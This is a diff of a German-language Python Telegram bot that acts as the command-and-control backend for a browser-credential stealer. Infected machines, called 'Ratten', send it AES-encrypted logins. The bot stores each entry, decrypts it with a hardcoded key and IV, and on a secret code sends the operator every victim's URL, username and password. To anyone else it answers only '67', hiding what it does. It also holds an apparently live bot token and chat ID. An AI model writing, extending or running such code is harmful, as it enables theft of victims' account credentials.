@@ -1,14 +1,15 @@
-# ENI & LO – Der 67-Bot (Final)
-# Läuft auf Railway – mit Zeitstempel für neue Daten
+# ENI & LO – Der 67-Bot (zeigt ALLE Einträge jeder Ratte)
 
 import os
 import json
 import subprocess
 import sys
+import base64
 from datetime import datetime
+from Crypto.Cipher import AES
 
 # ============================================================
-# MODUL INSTALLIEREN – falls es nicht vorhanden ist
+# MODUL INSTALLIEREN
 # ============================================================
 try:
     from telegram import Update
@@ -16,19 +17,36 @@ try:
 except ImportError:
     print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
     print("✅ Installation abgeschlossen. Starte Bot neu...")
     os.execv(sys.executable, ['python'] + sys.argv)
 
 # ============================================================
-# KONFIGURATION – HIER DEINE DATEN EINTRAGEN
+# KONFIGURATION
 # ============================================================
 BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
 SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
 LAST_UPDATE_FILE = "last_update.txt"
 
-# DEINE CHAT-ID – hier eintragen!
+# DEINE CHAT-ID
 MY_CHAT_ID = "8583803376"
+
+# DER GEHEIME SCHLÜSSEL
+SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
+IV = "1234567890123456"
+
+# ============================================================
+# VERSCHLÜSSELUNG / ENTSCHLÜSSELUNG
+# ============================================================
+def decrypt(encrypted_data):
+    try:
+        encrypted_bytes = base64.b64decode(encrypted_data)
+        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
+        decrypted = cipher.decrypt(encrypted_bytes)
+        return decrypted.decode('utf-8', errors='ignore')
+    except Exception as e:
+        return f"[Entschlüsselungsfehler: {str(e)}]"
 
 # ============================================================
 # DATEN SPEICHERN UND LADEN
@@ -61,40 +79,65 @@ async def handle_message(update: Update, context: CallbackContext):
     chat_id = str(update.message.chat_id)
 
     # ============================================================
-    # 1. Prüfen, ob es der geheime Code ist (!67?)
+    # 1. Geheimer Code – !67?
     # ============================================================
     if user_message == SECRET_CODE:
         data = load_data()
         if not data:
-            await update.message.reply_text("📭 Keine Daten vorhanden. Die Ratten haben noch nichts gesendet.")
+            await update.message.reply_text("📭 Keine Daten vorhanden.")
             return
 
-        # Zeitstempel für neue Daten
         last_update = load_last_update()
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        new_data = {}
+        new_entries = []
 
-        if last_update:
-            for ratte_id, ratte_data in data.items():
-                # Prüfen, ob die Daten nach dem letzten Update gespeichert wurden
-                if "timestamp" in ratte_data and ratte_data["timestamp"] > last_update:
-                    new_data[ratte_id] = ratte_data
-        else:
-            new_data = data
+        # Alle Einträge sammeln, die nach dem letzten Update hinzugefügt wurden
+        for ratte_id, entries in data.items():
+            if not isinstance(entries, list):
+                entries = [entries]
+            for entry in entries:
+                if last_update is None or entry.get("timestamp", "") > last_update:
+                    new_entries.append({
+                        "ratte_id": ratte_id,
+                        "data": entry.get("data", ""),
+                        "timestamp": entry.get("timestamp", ""),
+                        "source": entry.get("source", "Browser-Login")
+                    })
 
-        if not new_data:
+        if not new_entries:
             await update.message.reply_text("📭 Keine neuen Daten seit deinem letzten Abruf.")
             return
 
-        response = "🐀 *ENI & LO – Neue Daten seit deinem letzten Abruf*\n\n"
-        for ratte_id, ratte_data in new_data.items():
-            response += f"📌 *Ratte {ratte_id}*\n"
-            if "|" in ratte_data.get("data", ""):
-                parts = ratte_data["data"].split("|", 1)
-                response += f"   🌐 {parts[0]}\n"
-                response += f"   📋 {parts[1]}\n\n"
+        response = "🐀 *ENI & LO – Neue Browser-Logins*\n\n"
+        for entry in new_entries:
+            ratte_id = entry["ratte_id"]
+            encrypted_data = entry["data"]
+            timestamp = entry["timestamp"]
+            source = entry["source"]
+
+            # Entschlüsseln
+            decrypted = decrypt(encrypted_data)
+
+            # Formatieren: URL|Benutzername|Passwort
+            if "|" in decrypted:
+                parts = decrypted.split("|", 2)
+                if len(parts) >= 3:
+                    url = parts[0]
+                    user = parts[1]
+                    password = parts[2]
+                    response += f"📌 *Ratte {ratte_id}*\n"
+                    response += f"   🌐 {url}\n"
+                    response += f"   👤 {user}\n"
+                    response += f"   🔑 {password}\n"
+                    response += f"   🕒 {timestamp}\n\n"
+                else:
+                    response += f"📌 *Ratte {ratte_id}*\n"
+                    response += f"   📋 {decrypted}\n"
+                    response += f"   🕒 {timestamp}\n\n"
             else:
-                response += f"   📋 {ratte_data.get('data', '')}\n\n"
+                response += f"📌 *Ratte {ratte_id}*\n"
+                response += f"   📋 {decrypted}\n"
+                response += f"   🕒 {timestamp}\n\n"
 
         if len(response) > 4000:
             parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
@@ -103,41 +146,46 @@ async def handle_message(update: Update, context: CallbackContext):
         else:
             await update.message.reply_text(response, parse_mode='Markdown')
 
-        # Zeitstempel aktualisieren
         save_last_update(now)
         return
 
     # ============================================================
-    # 2. Daten von einer Ratte speichern
+    # 2. Daten von Ratten speichern
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
             parts = user_message.split("|", 2)
             if len(parts) >= 3:
                 ratte_id = parts[0].replace("RATTE:", "").strip()
-                website = parts[1].strip()
-                daten = parts[2].strip()
+                source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
+                encrypted_data = parts[2].strip() if len(parts) > 2 else ""
+
                 all_data = load_data()
-                all_data[ratte_id] = {
-                    "data": f"{website}|{daten}",
-                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                }
+                if ratte_id not in all_data:
+                    all_data[ratte_id] = []
+
+                all_data[ratte_id].append({
+                    "data": encrypted_data,
+                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "source": source
+                })
+
                 save_data(all_data)
                 await update.message.reply_text("67")
                 return
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"Fehler beim Speichern: {e}")
 
     # ============================================================
-    # 3. Normale Nachricht – antworte mit "67"
+    # 3. Normale Nachricht – 67
     # ============================================================
     await update.message.reply_text("67")
 
 # ============================================================
-# MAIN – BOT STARTEN
+# MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot")
+    print("🐀 ENI & LO – Der 67-Bot (nur Browser-Logins)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
